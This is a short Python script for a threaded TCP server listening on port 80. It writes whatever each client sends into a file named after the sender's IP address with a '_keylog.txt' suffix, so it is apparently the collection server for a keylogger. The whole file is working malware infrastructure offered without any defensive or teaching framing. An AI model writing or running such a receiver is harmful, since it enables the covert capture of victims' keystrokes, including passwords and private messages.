import socket
import threading
import os

# The IP address we will bind our receiver to
IP = "0.0.0.0"

# The port we will listen on
PORT = 80

class Receiver:
    def __init__(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.bind((IP, PORT))
        self.sock.listen(5)

    def start(self):
        print("Receiver started. Waiting for connections...")
        while True:
            # Accept an incoming connection
            conn, addr = self.sock.accept()
            threading.Thread(target=self.handle_connection, args=(conn, addr)).start()

    def handle_connection(self, conn, addr):
        try:
            # Receive data from the connected client
            while True:
                data = conn.recv(1024).decode()
                if not data:
                    break

                # Save the received data to a file based on the sender's IP address
                filename = f"{addr[0]}_keylog.txt"
                with open(filename, "a") as f:
                    f.write(data + "\n")
                print(f"Received: {data} - Saved to {filename}")

            # Close the connection
            conn.close()
        except Exception as e:
            print(f"Error handling connection from {addr}: {e}")
            conn.close()

    def run(self):
        self.start()
        while True:
            pass

if __name__ == "__main__":
    receiver = Receiver()
    receiver.run()